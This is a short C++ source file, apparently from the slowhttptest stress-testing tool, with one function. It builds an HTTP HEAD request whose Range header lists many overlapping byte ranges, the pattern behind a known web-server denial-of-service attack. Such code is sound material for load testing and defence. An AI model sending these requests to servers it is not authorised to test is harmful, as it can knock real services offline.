// (c) Victor Agababov (vagababov@gmail.com) 2011
// Not reserving most of the rights.
#include "range-request-generator.h"

#include <sstream>


#include "slowlog.h"


using std::string;

namespace {
const char prefix[] = "HEAD / HTTP/1.1\r\nHost: ";
}  // namespace

namespace slowhttptest {

void GenerateHeadRequestWithRange(const string& path, const string& host,
                                  int start, int step, int limit,
                                  string* output) {
  CHECK_NOTNULL(output)->clear();
  std::ostringstream oss;
  oss << prefix << host << "\r\nRange: bytes=0-,";
  for (int i = 0; i < limit; i+= step) {
    oss << start << '-' << i << ',';
  }
  oss << start << '-' << limit << "\r\nAccept-Encoding: gzip\r\nConnection:"
      << " close\r\n\r\n";
  *output = oss.str();
}

}  // namespace slowhttptest
